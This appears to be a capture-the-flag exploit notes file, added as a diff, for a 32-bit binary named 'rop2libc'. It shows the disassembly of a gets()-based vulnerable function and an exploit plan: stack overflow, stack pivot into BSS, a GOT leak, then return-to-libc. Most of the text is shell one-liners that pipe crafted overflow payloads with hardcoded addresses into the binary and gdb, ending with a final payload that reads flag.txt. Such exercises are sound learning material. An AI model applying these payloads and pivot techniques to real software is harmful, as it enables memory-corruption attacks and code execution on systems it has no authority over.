@@ -1,0 +1,52 @@
+0804844d <vuln>:
+ 804844d:       55                      push   %ebp
+ 804844e:       89 e5                   mov    %esp,%ebp
+ 8048450:       83 ec 58                sub    $0x58,%esp
+ 8048453:       8d 45 b8                lea    -0x48(%ebp),%eax
+ 8048456:       89 04 24                mov    %eax,(%esp)
+ 8048459:       e8 c2 fe ff ff          call   8048320 <gets@plt>
+ 804845e:       8d 45 b8                lea    -0x48(%ebp),%eax
+ 8048461:       89 44 24 04             mov    %eax,0x4(%esp)
+ 8048465:       c7 04 24 20 85 04 08    movl   $0x8048520,(%esp)
+ 804846c:       e8 9f fe ff ff          call   8048310 <printf@plt>
+ 8048471:       c9                      leave
+ 8048472:       c3                      ret
+
+08048473 <main>:
+ 8048473:       55                      push   %ebp
+ 8048474:       89 e5                   mov    %esp,%ebp
+ 8048476:       83 e4 f0                and    $0xfffffff0,%esp
+ 8048479:       e8 cf ff ff ff          call   804844d <vuln>
+ 804847e:       b8 00 00 00 00          mov    $0x0,%eax
+ 8048483:       c9                      leave
+ 8048484:       c3                      ret
+
+Running twice
+-----------------------------------------------
+{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\x79\x84\x04\x08"; sleep 1; echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"; } | ./rop2libc
+
+Exploit plan:
+-Do stack overflow, setting EBP=BSS start and EIP=0x8048453
+-Use gets() to read stack contents into the BSS
+-Return, with ESP=EBP, EBP=valid value from BSS, and EIP=0x8048465
+-Print out whatever we want (GOT contents or something?)
+-Return, with ESP=EBP, EBP=valid value from BSS, and EIP=0x8048453
+-[Python code inspecting everything to calculate libc addrs]
+-Overflow with call to system()
+
+Doing it
+--------------------------------------------------------------------
+Let EBP start as 0x0804a824+0x48=0x804a86c, so the writing initiates with the BSS
+
+Retun into leave; ret, letting ESP=EBP and setting EBP to something else
+
+{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x6c\xa0\x04\x08\x53\x84\x04\x08"; sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x74\xa0\x04\x08\x71\x84\x04\x08\x84\xa0\x04\x08\x65\x84\x04\x08STRR\x20\x85\x04\x08\x8c\xa0\x04\x08\x53\x84\x04\x08"; sleep 1; echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBB"; } | ./rop2libc
+
+{ sleep 1; echo "r"; sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x6c\xa8\x04\x08\x53\x84\x04\x08"; sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x74\xa8\x04\x08\x71\x84\x04\x08\x84\xa8\x04\x08\x65\x84\x04\x08STRR\x20\x85\x04\x08\x8c\xa8\x04\x08\x53\x84\x04\x08"; sleep 1; echo "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"; } | gdb rop2libc
+
+{ sleep 1; echo "r"; sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x6c\xa8\x04\x08\x53\x84\x04\x08"; sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x74\xa8\x04\x08\x71\x84\x04\x08\x84\xa8\x04\x08\x65\x84\x04\x08STRR\x20\x85\x04\x08\x8c\xa8\x04\x08\x53\x84\x04\x08"; sleep 1; echo -e "AAAA\xEE\xEE\xEE\xEECCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"; } | gdb rop2libc
+
+{ sleep 1; echo "r"; sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x6c\xa8\x04\x08\x53\x84\x04\x08"; sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x74\xa8\x04\x08\x71\x84\x04\x08\x84\xa8\x04\x08\x65\x84\x04\x08STRR\x20\x85\x04\x08\x8c\xa8\x04\x08\x53\x84\x04\x08"; sleep 1; echo -e "AAAA\xEE\xEE\xEE\xEECCCC"; } | gdb rop2libc
+
+Final:
+{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x6c\xa8\x04\x08\x53\x84\x04\x08"; sleep 1; echo -e "cat flag.txt\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x74\xa8\x04\x08\x71\x84\x04\x08\x84\xa8\x04\x08\x65\x84\x04\x08STRR\x20\x85\x04\x08\x8c\xa8\x04\x08\x53\x84\x04\x08"; sleep 1; echo -e "AAAA\xEE\xEE\xEE\xEECCCC"; } | ./rop2libc
